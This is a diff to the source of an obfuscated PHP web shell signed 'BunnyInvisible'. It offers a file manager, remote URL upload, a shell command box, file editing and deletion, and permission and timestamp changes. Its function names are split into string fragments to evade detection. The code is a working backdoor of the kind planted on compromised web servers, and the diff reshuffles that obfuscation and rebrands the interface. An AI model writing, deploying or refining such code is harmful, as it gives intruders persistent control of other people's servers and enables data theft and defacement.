@@ -593,6 +494,7 @@ $path = str_replace("\\", "/", $path);
                         $fi_le_Na_me = $_FILES["file"]["name"][$i];
                         $location = "" . $fi_le_Na_me;
                         $u_pl_oa_dF_un_ct_ion = "m"."ove" . "_up" . "loa"."ded_fi" . "le";
+            
                         if ($u_pl_oa_dF_un_ct_ion($_FILES["file"]["tmp_name"][$i], $location)) {
                             echo '
                             <div class="uk-alert-success uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
@@ -622,6 +524,13 @@ $path = str_replace("\\", "/", $path);
         </div>
         <?php
             if (isset($_POST['btn-remoteup'])) {
+                $hayoloh = 'h'.'tm'.'ls'.'pe'.'cial'.'ch'.'ars';
+                $b_name = 'b'.'as'.'en'.'am'.'e';
+                $f_get = 'f'.'il'.'e'.'_'.'g'.'e'.'t'.'_'.'co'.'nten'.'t'.'s';
+                $f_put = 'f'.'il'.'e'.'_'.'pu'.'t'.'_'.'co'.'n'.'te'.'nt'.'s';
+                $fo = "fop"."en";
+                $fw = "fw"."r"."it"."e";
+                $fc = 'fc'.'lo'.'s'.'e';
                 $this_file = $_POST['fileurl'];
                 $this_file_name = $_POST['savedname'];
                 $f_content = $f_get($this_file);
@@ -666,7 +575,7 @@ $path = str_replace("\\", "/", $path);
                 <fieldset class="uk-fieldset">
                     <legend class="uk-legend font-bold font-protest-riot"><?='Re'.'mo'.'te'.' U'.'pl'.'oa'.'d'?></legend>
                     <div class="uk-margin-small">
-                        <input class="uk-input font-poppins" name="fileurl" type="text" placeholder="<?='ht'.'tp'.'s'.':/'.'/n'.'ul'.'z.'.'ed'.'u.'.'go'.'v.'.'ac'.'.i'.'d.'.'go'.'.i'.'d/'.'nu'.'lz'.'.tx'.'t'?>" aria-label="Input">
+                        <input class="uk-input font-poppins" name="fileurl" type="text" placeholder="https://bunnyinvisible.go.id/file.txt" aria-label="Input">
                         <div class="uk-margin-small"></div>
                         <input class="uk-input font-poppins" name="savedname" type="text" placeholder="saved.txt" aria-label="Input">
                     </div>
@@ -677,9 +586,9 @@ $path = str_replace("\\", "/", $path);
             </form>
         </div>
         <div class="tools-etc uk-flex uk-flex-center uk-flex-middle uk-flex-row uk-flex-wrap">
-            <a href="?path=<?=$path?>&tools=newfiles"><button class="btn-new-file uk-button uk-button-default uk-margin-large-bottom font-white font-protest-riot"><i class="fa-solid fa-file-plus"></i>&nbsp;<?='N'.'ew'.' F'.'il'.'e'.'s'?></button></a>
-            <a href="?path=<?=$path?>&tools=cmd"><button class="btn-cmd uk-button uk-button-default uk-margin-small-left uk-margin-small-right uk-margin-large-bottom font-white font-ubuntu-mono"><i class="fa-solid fa-rectangle-terminal"></i>&nbsp;<?='C'.'o'.'mm'.'an'.'d'?></button></a>
-            <a href="?path=<?=$path?>&tools=newfolder"><button class="btn-new-folder uk-button uk-button-default uk-margin-large-bottom font-white font-protest-riot"><i class="fa-sharp fa-solid fa-folder-plus"></i>&nbsp;<?='N'.'ew'.' F'.'ol'.'de'.'r'?></button></a>
+            <a href="?path=<?=$path?>&tools=newfiles"><button class="btn-new-file uk-button uk-button-default uk-margin-large-bottom font-white font-protest-riot"><i class="fa-solid fa-file-plus"></i>&nbsp;New Files</button></a>
+            <a href="?path=<?=$path?>&tools=cmd"><button class="btn-cmd uk-button uk-button-default uk-margin-small-left uk-margin-small-right uk-margin-large-bottom font-white font-ubuntu-mono"><i class="fa-solid fa-rectangle-terminal"></i>&nbsp;Command</button></a>
+            <a href="?path=<?=$path?>&tools=newfolder"><button class="btn-new-folder uk-button uk-button-default uk-margin-large-bottom font-white font-protest-riot"><i class="fa-sharp fa-solid fa-folder-plus"></i>&nbsp;New Folder</button></a>
         </div>
         <div class="mass uk-flex uk-flex-center uk-flex-middle uk-flex-column">
             <?php
@@ -692,14 +601,14 @@ $path = str_replace("\\", "/", $path);
                                     echo '
                                     <div class="uk-alert-success" uk-alert>
                                         <a href class="uk-alert-close" uk-close></a>
-                                        <p>'.$folder.' De'.'le'.'te'.'d!&nbsp;<i class="fa-solid fa-trash-check"></i></p>
+                                        <p>'.$folder.' Deleted!&nbsp;<i class="fa-solid fa-trash-check"></i></p>
                                     </div>
                                     ';
                                 } else {
                                     echo '
                                     <div class="uk-alert-danger" uk-alert>
                                         <a href class="uk-alert-close" uk-close></a>
-                                        <p>'.$folder.' C'.'an'.' N'.'ot'.' D'.'el'.'et'.'e'.'d!&nbsp;<i class="fa-solid fa-trash-xmark"></i></p>
+                                        <p>'.$folder.' Can Not Deleted!&nbsp;<i class="fa-solid fa-trash-xmark"></i></p>
                                     </div>
                                     ';
                                 }
@@ -713,14 +622,14 @@ $path = str_replace("\\", "/", $path);
                                     echo '
                                     <div class="uk-alert-success" uk-alert>
                                         <a href class="uk-alert-close" uk-close></a>
-                                        <p>'.$file.' De'.'le'.'te'.'d!&nbsp;<i class="fa-solid fa-trash-check"></i></p>
+                                        <p>'.$file.' Deleted!&nbsp;<i class="fa-solid fa-trash-check"></i></p>
                                     </div>
                                     ';
                                 } else {
                                     echo '
                                     <div class="uk-alert-danger" uk-alert>
                                         <a href class="uk-alert-close" uk-close></a>
-                                        <p>'.$file.' Ca'.'n '.'No'.'t D'.'el'.'et'.'ed'.'!&nbsp;<i class="fa-solid fa-trash-xmark"></i></p>
+                                        <p>'.$file.' Can Not Deleted!&nbsp;<i class="fa-solid fa-trash-xmark"></i></p>
                                     </div>
                                     ';
                                 }
@@ -740,14 +649,14 @@ $path = str_replace("\\", "/", $path);
                     echo '
                         <div class="uk-alert-success" uk-alert>
                             <a href class="uk-alert-close" uk-close></a>
-                            <p>Success, F'.'ol'.'de'.'r D'.'el'.'et'.'e'.'d!&nbsp;<i class="fa-solid fa-trash-check"></i></p>
+                            <p>Success, Folder Deleted!&nbsp;<i class="fa-solid fa-trash-check"></i></p>
                         </div>
                         ';
                     } else {
                     echo '
                         <div class="uk-alert-danger" uk-alert>
                             <a href class="uk-alert-close" uk-close></a>
-                            <p>Failed, F'.'ol'.'d'.'er'.' C'.'an'.' N'.'o'.'t D'.'el'.'et'.'e'.'d!&nbsp;<i class="fa-solid fa-trash-xmark"></i></p>
+                            <p>Failed, Folder Can Not Deleted!&nbsp;<i class="fa-solid fa-trash-xmark"></i></p>
                         </div>
                         ';
                     }
@@ -758,14 +667,14 @@ $path = str_replace("\\", "/", $path);
                 echo '
                     <div class="uk-alert-success" uk-alert>
                         <a href class="uk-alert-close" uk-close></a>
-                        <p>Success, F'.'i'.'l'.'e D'.'el'.'et'.'ed'.'!&nbsp;<i class="fa-solid fa-trash-check"></i></p>
+                        <p>Success, File Deleted!&nbsp;<i class="fa-solid fa-trash-check"></i></p>
                     </div>
                     ';
                 } else {
                 echo '
                 <div class="uk-alert-danger" uk-alert>
                     <a href class="uk-alert-close" uk-close></a>
-                    <p>Failed, F'.'il'.'e C'.'a'.'n No'.'t D'.'e'.'le'.'te'.'d!&nbsp;<i class="fa-solid fa-trash-xmark"></i></p>
+                    <p>Failed, File Can Not Deleted!&nbsp;<i class="fa-solid fa-trash-xmark"></i></p>
                 </div>
                 ';
                 }
@@ -775,6 +684,11 @@ $path = str_replace("\\", "/", $path);
                 //null
             } elseif ($toolsparam === 'newfiles') {
                 if (isset($_POST['btn-newfiles'])) {
+                    $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
+                    $f_put = 'f'.'il'.'e'.'_'.'p'.'u'.'t'.'_'.'co'.'nt'.'e'.'n'.'ts';
+                    $f_o = 'fo'.'p'.'e'.'n';
+                    $f_w = 'fw'.'ri'.'t'.'e';
+                    $f_c = 'fc'.'lo'.'s'.'e';
                     $fi_le_name = htmlspecialchars($_POST['newfilesname']);
                     $fi_le_content = $_POST['newfilecontent'];
                     $f_il_e_success = '
@@ -793,12 +707,12 @@ $path = str_replace("\\", "/", $path);
                         echo '
                         <div class="uk-alert-warning" uk-alert>
                             <a href class="uk-alert-close" uk-close></a>
-                            <p>Sorry. Cant Not Cr'.'e'.'a'.'t'.'e Fi'.'l'.'es. Your Input Is Empty&nbsp;<i class="fa-regular fa-location-exclamation font-yellow"></i></p>
+                            <p>Sorry. Cant Not Create Fi'.'l'.'es. Your Input Is Empty&nbsp;<i class="fa-regular fa-location-exclamation font-yellow"></i></p>
                         </div>
                         ';
                     } else {
-                        if ($func_exist($fo)) {
-                            $c_r_e_a_t_e_f_i_l_e_1 = $fo($fi_le_name, 'w');
+                        if ($func_exist($f_o)) {
+                            $c_r_e_a_t_e_f_i_l_e_1 = $f_o($fi_le_name, 'w');
                             if ($c_r_e_a_t_e_f_i_l_e_1 === false) {
                                 $c_r_e_a_t_e_f_i_l_e_2 = $f_put($fi_le_name, $fi_le_content);
                                 if ($c_r_e_a_t_e_f_i_l_e_2 === false) {
@@ -807,12 +721,12 @@ $path = str_replace("\\", "/", $path);
                                     echo $f_il_e_success;
                                 }
                             } else {
-                                if ($fw($c_r_e_a_t_e_f_i_l_e_1, $fi_le_content) === false) {
+                                if ($f_w($c_r_e_a_t_e_f_i_l_e_1, $fi_le_content) === false) {
                                     echo $f_il_e_failed;
                                 } else {
                                     echo $f_il_e_success;
                                 }
-                                $fc($c_r_e_a_t_e_f_i_l_e_1);
+                                $f_c($c_r_e_a_t_e_f_i_l_e_1);
                             }
                         } elseif ($func_exist($f_put)) {
                             $c_r_e_a_t_e_f_i_l_e_2 = $f_put($fi_le_name, $fi_le_content);
@@ -825,7 +739,7 @@ $path = str_replace("\\", "/", $path);
                             echo '
                             <div class="uk-alert-warning" uk-alert>
                                 <a href class="uk-alert-close" uk-close></a>
-                                <p>Sorry. Cant Not Cr'.'ea'.'t'.'e Fi'.'le'.'s&nbsp;<i class="fa-regular fa-location-exclamation font-yellow"></i></p>
+                                <p>Sorry. Cant Not Create Fi'.'le'.'s&nbsp;<i class="fa-regular fa-location-exclamation font-yellow"></i></p>
                             </div>
                             ';
                         }
@@ -844,7 +758,7 @@ $path = str_replace("\\", "/", $path);
                             <input class="uk-input font-poppins" name="newfi'.'l'.'es'.'na'.'me" type="text" placeholder="fi'.'le'.'na'.'me.'.'t'.'x'.'t" aria-label="Input">
                         </div>
                         <div class="uk-margin">
-                            <textarea class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" placeholder="BunnyInvisible Was Here!" aria-label="Textarea"></textarea>
+                            <textarea class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" placeholder="BunnyInvisible Was Here" aria-label="Textarea"></textarea>
                         </div>
                     </fieldset>
                 </form>
@@ -852,6 +766,8 @@ $path = str_replace("\\", "/", $path);
             } elseif ($toolsparam === 'newfolder') {
                 if (isset($_POST['btn-newfolder'])) {
                     $f_ol_de_r_name = htmlspecialchars($_POST['newfoldername']);
+                    $cr_ea_teF_old_er = "mk"."d"."ir";
+                    $is_d = 'i'.'s'.'_'.'d'.'ir';
                     $f_ol_de_r_success = '
                     <div class="uk-alert-success" uk-alert>
                         <a href class="uk-alert-close" uk-close></a>
@@ -893,11 +809,11 @@ $path = str_replace("\\", "/", $path);
                 <form action="" method="POST" class="uk-width-1-2">
                     <fieldset class="uk-fieldset">
                         <div class="uk-margin uk-float-right">
-                            <button type="submit" name="btn-newfolder" class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Cr'.'ea'.'te'.' F'.'ol'.'de'.'r</button>
+                            <button type="submit" name="btn-newfolder" class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Create Folder</button>
                         </div>
-                        <legend class="uk-legend font-bold font-protest-riot">N'.'e'.'w '.'F'.'ol'.'de'.'r</legend>
+                        <legend class="uk-legend font-bold font-protest-riot">New Folder</legend>
                         <div class="uk-margin">
-                            <input class="uk-input font-poppins" name="newfoldername" type="text" placeholder="N'.'e'.'w F'.'ol'.'d'.'er" aria-label="Input">
+                            <input class="uk-input font-poppins" name="newfoldername" type="text" placeholder="New Folder" aria-label="Input">
                         </div>
                     </fieldset>
                 </form>
@@ -906,10 +822,10 @@ $path = str_replace("\\", "/", $path);
                 echo '
                 <form action="" method="POST" class="uk-width-1-2">
                     <fieldset class="uk-fieldset">
-                        <legend class="uk-legend font-bold font-protest-riot"><i class="fa-solid fa-rectangle-terminal"></i>&nbsp;&nbsp;C'.'o'.'mm'.'an'.'d</legend>
+                        <legend class="uk-legend font-bold font-protest-riot"><i class="fa-solid fa-rectangle-terminal"></i>&nbsp;&nbsp;Command</legend>
                         <div class="uk-margin-small uk-flex uk-flex-row uk-flex-center uk-flex-middle uk-flex-nowrap">
                             <label for="komendnya" class="uk-margin-small-right uk-text-large">$</label>
-                            <input style="background: var(--gray-950);" class="uk-input font-poppins uk-margin-small-right" id="komendnya" name="komendnya" type="text" aria-label="Input" autofocus>
+                            <input style="background: var(--gray-950);" class="uk-input font-poppins uk-margin-small-right" id="komendnya" name="komendnya" type="text" placeholder="uname -a" aria-label="Input" autofocus>
                             <button type="submit" name="btn-cmd" style="background: var(--gray-950); border: 1px solid var(--gray-700);" class="uk-button uk-button-secondary uk-text-bold uk-border-rounded">ENTER</button>
                         </div>
                         <div>';
@@ -925,19 +841,26 @@ $path = str_replace("\\", "/", $path);
             }
 
             if (isset($_GET['editfile'])) {
+                $hayoloh = 'h'.'tm'.'ls'.'pe'.'cial'.'ch'.'ars';
+                $f_get = 'f'.'il'.'e'.'_'.'g'.'e'.'t'.'_'.'co'.'nt'.'en'.'t'.'s';
+                $f_put = 'f'.'il'.'e'.'_'.'p'.'u'.'t'.'_'.'co'.'nt'.'e'.'n'.'ts';
+                $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
+                $fo = "fop"."en";
+                $fw = "fw"."r"."it"."e";
+                $fc = 'fc'.'lo'.'s'.'e';
                 $this_file = $_GET['editfile'];
                 if (isset($_POST['btn-editfiles'])) {
                     $newfilecontent = $_POST['newfilecontent'];
                     $f_il_e_success = '
                         <div class="uk-alert-success" uk-alert>
                             <a href class="uk-alert-close" uk-close></a>
-                            <p>Success, Fi'.'le Saved&nbsp;<i class="fa-solid fa-file-check font-green"></i></p>
+                            <p>Success, File Saved&nbsp;<i class="fa-solid fa-file-check font-green"></i></p>
                         </div>
                         ';
                     $f_il_e_failed = '
                     <div class="uk-alert-danger" uk-alert>
                         <a href class="uk-alert-close" uk-close></a>
-                        <p>Failed, Fi'.'le Not Saved&nbsp;<i class="fa-solid fa-file-xmark font-red"></i></p>
+                        <p>Failed, File Not Saved&nbsp;<i class="fa-solid fa-file-xmark font-red"></i></p>
                     </div>
                     ';
                     if ($func_exist($fo)) {
@@ -958,7 +881,7 @@ $path = str_replace("\\", "/", $path);
                         echo '
                         <div class="uk-alert-warning" uk-alert>
                             <a href class="uk-alert-close" uk-close></a>
-                            <p>Sorry. Cant Edit This Fi'.'le '.$this_file.'&nbsp;<i class="fa-solid fa-file-exclamation"></i></p>
+                            <p>Sorry. Cant Edit This File '.$this_file.'&nbsp;<i class="fa-solid fa-file-exclamation"></i></p>
                         </div>
                         ';
                     }
@@ -971,14 +894,14 @@ $path = str_replace("\\", "/", $path);
                             <button type="submit" name="btn-editfiles" class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Save</button>
                         </div>
                         <legend class="uk-legend font-bold font-protest-riot">Edit Files</legend>
-                        <p class="font-teal">'.$path.'/'.$this_file.'</p>
                         <div class="uk-margin">
-                            <textarea style="background: var(--gray-950); color: var(--emerald-500);" class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" aria-label="Textarea">'.$hayoloh(BunnyReadFile($this_file)).'</textarea>
+                            <textarea class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" placeholder="BunnyInvisible Was Here" aria-label="Textarea">'.$hayoloh($f_get($this_file)).'</textarea>
                         </div>
                     </fieldset>
                 </form>
                 ';
             }
+
             if (isset($_GET['rename'])) {
                 $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
                 $this_name = $_GET['rename'];
@@ -1012,7 +935,6 @@ $path = str_replace("\\", "/", $path);
                         <div class="uk-margin uk-float-right">
                             <button type="submit" name="btn-rename" class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Rename</button>
                         </div>
-                        <p class="font-teal">'.$path.'/'.$this_name.'</p>
                         <legend class="uk-legend font-bold font-protest-riot">Rename</legend>
                         <div class="uk-margin">
                             <input class="uk-input font-poppins" name="newname" type="text" value="'.$this_name.'" aria-label="Input">
@@ -1051,7 +973,6 @@ $path = str_replace("\\", "/", $path);
                         <div class="uk-margin uk-float-right">
                             <button type="submit" name="btn-permission" class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Change Permission</button>
                         </div>
-                        <p class="font-teal">'.$value.'</p>
                         <legend class="uk-legend font-bold font-protest-riot">Cange Permission</legend>
                         <div class="uk-margin">
                             <input class="uk-input font-poppins" name="newperms" type="text" value="'.chPerms($value).'" aria-label="Input">
@@ -1101,7 +1022,6 @@ $path = str_replace("\\", "/", $path);
                         <div class="uk-margin uk-float-right">
                             <button type="submit" name="btn-newdate" class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Change Date</button>
                         </div>
-                        <p class="font-teal">'.$path.'/'.$value.'</p>
                         <legend class="uk-legend font-bold font-protest-riot">Cange Date</legend>
                         <div class="uk-margin">
                             <input class="uk-input font-poppins" name="newdate" type="text" value="'.$this_date.'" aria-label="Input">
@@ -1133,19 +1053,28 @@ $path = str_replace("\\", "/", $path);
                     </thead>
                     <tbody>
                         <tr>
-                            <td><?='-'.'M' . 'I' . 'N' . 'I'.'-'?></td>
+                            <td><?='-'.'B'.'I'.'C'.'-'?></td>
                             <td class="body-folder uk-text-nowrap"><a href="?path=<?=dirname($path)?>" class="dirpath font-white"><i class="fa-duotone fa-folders font-amber"></i>&nbsp;&nbsp;..</a></td>
-                            <td><?='-'.'-'.'M' . 'I' . 'N' . 'I'.'-'.'-'?></td>
-                            <td><?='-'.'-'.'M' . 'I' . 'N' . 'I'.'-'.'-'?></td>
-                            <td><?='-'.'-'.'M' . 'I' . 'N' . 'I'.'-'.'-'?></td>
-                            <td><?='-'.'-'.'M' . 'I' . 'N' . 'I'.'-'.'-'?></td>
-                            <td><?='-'.'-'.'M' . 'I' . 'N' . 'I'.'-'.'-'?></td>
+                            <td><?='-'.'B'.'U'.'N'.'N'.'Y'.'-'?></td>
+                            <td><?='-'.'B'.'U'.'N'.'N'.'Y'.'-'?></td>
+                            <td><?='-'.'B'.'U'.'N'.'N'.'Y'.'-'?></td>
+                            <td><?='-'.'B'.'U'.'N'.'N'.'Y'.'-'?></td>
+                            <td><?='-'.'B'.'U'.'N'.'N'.'Y'.'-'?></td>
                         </tr>
                         <?php
                         foreach ($scan as $dir) {
                             if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..')
                                 continue;
-
+                            $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
+                            $psx_euid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'u'.'i'.'d';
+                            $psx_egid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'g'.'i'.'d';
+                            $psx_usr_uid = 'p'.'os'.'ix'.'_'.'g'.'et'.'pw'.'u'.'i'.'d';
+                            $psx_grp_gid = 'p'.'os'.'ix'.'_'.'ge'.'tg'.'rg'.'i'.'d';
+                            $myuid = 'g'.'et'.'my'.'ui'.'d';
+                            $mygid = 'g'.'et'.'my'.'gi'.'d';
+                            $cur_usr = 'g'.'et'.'_'.'cu'.'rr'.'en'.'t'.'_'.'us'.'er';
+                            $own_f = 'fi'.'le'.'ow'.'n'.'er';
+                            $grp_f = 'fi'.'le'.'gr'.'ou'.'p';
                             if($func_exist($psx_usr_uid)) {
                                 $d_owner = @$psx_usr_uid($own_f("$path/$dir"));
                                 $d_owner = $d_owner['name'];
@@ -1177,11 +1106,14 @@ $path = str_replace("\\", "/", $path);
                                 }
                             echo '</td>';
                             echo '<td class="uk-text-nowrap"><a href="?path='.$path.'&permission='.$dir.'" class="body-permission">';
+                            $is_w = 'is'.'_'.'wr'.'it'.'ab'.'le';
+                            $is_r = 'is'.'_'.'re'.'ad'.'ab'.'le';
                                 if ($is_w("$path/$dir"))
                                     echo '<font class="font-green green-perms">';
                                 elseif (!$is_r("$path/$dir"))
                                     echo '<font class="font-red red-perms">';
                                     echo perms("$path/$dir");
+
                                 if ($is_w("$path/$dir") || !$is_r("$path/$dir"))
                             echo '</font></a></td>';
                             echo '<td class="uk-text-nowrap">';
@@ -1192,16 +1124,29 @@ $path = str_replace("\\", "/", $path);
                             echo '</tr>';
                         }
                         foreach ($scan as $file) {
-                            $f_size = 'f'.'il'.'es'.'iz'.'e';
+                            $is_f = 'is'.'_'.'f'.'il'.'e';
+                            $f_sz = 'f'.'il'.'es'.'iz'.'e';
+                            $rnd = 'ro'.'un'.'d';
+                            $f_time = 'fi'.'l'.'em'.'ti'.'m'.'e';
                             if (!$is_f("$path/$file"))
                                 continue;
-                            $size = $f_size("$path/$file") / 1024;
+                            $size = $f_sz("$path/$file") / 1024;
                             $size = $rnd($size, 3);
                             if ($size >= 1024) {
                                 $size = $rnd($size / 1024, 2) . ' MB';
                             } else {
                                 $size = $size . ' KB';
                             }
+                            $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
+                            $psx_euid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'u'.'i'.'d';
+                            $psx_egid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'g'.'i'.'d';
+                            $psx_usr_uid = 'p'.'os'.'ix'.'_'.'g'.'et'.'pw'.'u'.'i'.'d';
+                            $psx_grp_gid = 'p'.'os'.'ix'.'_'.'ge'.'tg'.'rg'.'i'.'d';
+                            $myuid = 'g'.'et'.'my'.'ui'.'d';
+                            $mygid = 'g'.'et'.'my'.'gi'.'d';
+                            $cur_usr = 'g'.'et'.'_'.'cu'.'rr'.'en'.'t'.'_'.'us'.'er';
+                            $own_f = 'fi'.'le'.'ow'.'n'.'er';
+                            $grp_f = 'fi'.'le'.'gr'.'ou'.'p';
                             if($func_exist($psx_usr_uid)) {
                                 $f_owner = @$psx_usr_uid($own_f("$path/$file"));
                                 $f_owner = $f_owner['name'];
@@ -1233,11 +1178,14 @@ $path = str_replace("\\", "/", $path);
                                 }
                             echo '</td>';
                             echo '<td class="uk-text-nowrap"><a href="?path='.$path.'&permission='.$file.'" class="body-permission">';
+                            $is_w = 'is'.'_'.'wr'.'it'.'ab'.'le';
+                            $is_r = 'is'.'_'.'re'.'ad'.'ab'.'le';
                                 if ($is_w("$path/$file"))
                                     echo '<font class="font-green green-perms">';
                                 elseif (!$is_r("$path/$file"))
                                     echo '<font class="font-red red-perms">';
                                     echo perms("$path/$file");
+
                                 if ($is_w("$path/$file") || !$is_r("$path/$file"))
                             echo '</font></a></td>';
                             echo '<td class="uk-text-nowrap">';
@@ -1284,10 +1232,11 @@ $path = str_replace("\\", "/", $path);
     </div>
     <div class="footer uk-margin-large-top uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-nowrap" style="background: var(--gray-950);">
         <div class="footer-content uk-padding-small">
-            <span class="font-protest-riot"><font class="font-poppins">&copy;2020 - <?=date("Y");?></font> | <a class="font-rose" href="https://t.me/BunnyInvisible404">./BunnyInvisible404</a></span>
+            <span class="font-protest-riot"><font class="font-poppins">&copy;2020 - <?=date("Y");?></font> | <a class="font-rose" href="https://t.me/BunnyInvisible404">BunnyInvisible</a></span>
         </div>
     </div>
     <script src="<?=$uikit_js?>"></script>
     <script src="<?=$uikit_icon?>"></script>
 </body>
-</html>
+
+</html> 
